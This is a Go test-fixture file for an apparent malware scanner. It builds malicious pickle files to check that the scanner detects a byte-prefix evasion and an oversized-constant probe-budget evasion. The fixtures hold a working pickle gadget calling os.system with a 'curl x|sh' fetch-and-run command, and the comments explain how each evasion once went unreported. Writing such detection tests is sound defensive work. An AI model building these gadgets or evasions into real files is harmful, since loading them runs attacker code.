package main

import "encoding/binary"

// picklePrefixFixtures writes the fixtures for the two pickle-claim fixes of the
// silent-miss round: the probe budget, and the head gate that preceded it.
//
//   - pickle_prefix_elf_gadget.pkl is b"\x7fELF" followed by a small protocol-4
//     stream that ends in os.system. The four prefix bytes are not one of the
//     letters a protocol-0 pickle opens with, so the sniffer refused the file: it
//     was dispatched "unknown" (or, before the native claim was fixed, "native"),
//     which has no parser, so a loadable gadget produced no finding at all. A
//     byte prefix in front of a pickle is the nullifAI shape (February 2025) that
//     SC4N-PICKLE-PREFIX exists to report.
//   - pickle_prefix_fat_constant.pkl is the same stream behind a 260 KiB constant.
//     A silent probe walk has a 256 KiB budget, so the walk stopped after two
//     opcodes and the file was refused. The size of that constant is the
//     attacker's to pick, which made this a reliable way to hide whatever follows
//     it; the contract is now that a protocol-bearing stream which walks cleanly
//     up to the budget is claimed.
//   - anytext_late_proto.txt is the control for the bound: a text document whose
//     protocol byte sits past the 64-byte prefix probe must stay text (it is a
//     document with one invalid byte, which is SC4N-CONTENT-NOT-UTF8), never a
//     pickle.
func init() {
	register(contributor{
		name:     "pickle-prefix",
		fixtures: picklePrefixFixtures,
		expectations: func() (malicious, benign map[string]expectation) {
			return map[string]expectation{
				"pickle_prefix_elf_gadget.pkl": {
					Expect: []string{"SC4N-PICKLE-GLOBAL-CRITICAL", "SC4N-PICKLE-PREFIX", "SC4N-PICKLE-REDUCE"},
					Notes: "A protocol-4 stream behind a 4-byte \"\\x7fELF\" prefix, ending in os.system. " +
						"The prefix is what the nullifAI campaign used; before this round the file was " +
						"dispatched as native (the prefix is a magic) and then, once a bare magic stopped " +
						"being a claim, as unknown — both of which report NOTHING for a stream that ends " +
						"in a system() call.",
				},
				"pickle_prefix_fat_constant.pkl": {
					Expect: []string{"SC4N-PICKLE-GLOBAL-CRITICAL", "SC4N-PICKLE-REDUCE"},
					Notes: "The same gadget behind a constant larger than the 256 KiB probe budget, with a " +
						"4-byte junk prefix. The silent probe walk used to stop inside the constant and " +
						"refuse the file, so the artifact was unknown and the gadget unreported; the " +
						"constant's length is the attacker's choice, so this was a one-line evasion.",
				},
				"anytext_late_proto.txt": {
					Expect: []string{"SC4N-CONTENT-NOT-UTF8"},
					Forbid: []string{"SC4N-PICKLE-GLOBAL-CRITICAL", "SC4N-PICKLE-REDUCE"},
					Notes: "A text document carrying a protocol byte at offset 200, i.e. past the 64-byte " +
						"prefix probe. The bound is what keeps the widened head test cheap and keeps an " +
						"ordinary document from being claimed as a pickle; the invalid byte still makes " +
						"the text-only layers stand down, which is reported.",
				},
			}, map[string]expectation{}
		},
	})
}

func picklePrefixFixtures(f *fixtureSet) {
	// PROTO 4 + BINUNICODE + os.system + SHORT_BINUNICODE "curl x|sh" + REDUCE.
	gadget := func(constant int) []byte {
		b := []byte{0x80, 0x04, 0x58}
		b = binary.LittleEndian.AppendUint32(b, uint32(constant))
		b = append(b, make([]byte, constant)...)
		b = append(b, []byte("\x63os\nsystem\n\x8c\x09curl x|sh\x85\x52.")...)
		return b
	}

	f.add("pickle_prefix_elf_gadget.pkl",
		append([]byte("\x7fELF"), gadget(16)...))

	f.add("pickle_prefix_fat_constant.pkl",
		append([]byte("junk"), gadget(260*1024)...))

	doc := make([]byte, 0, 512)
	for range 200 {
		doc = append(doc, 'a')
	}
	doc = append(doc, '\n')
	f.add("anytext_late_proto.txt", append(doc, gadget(16)...))
}
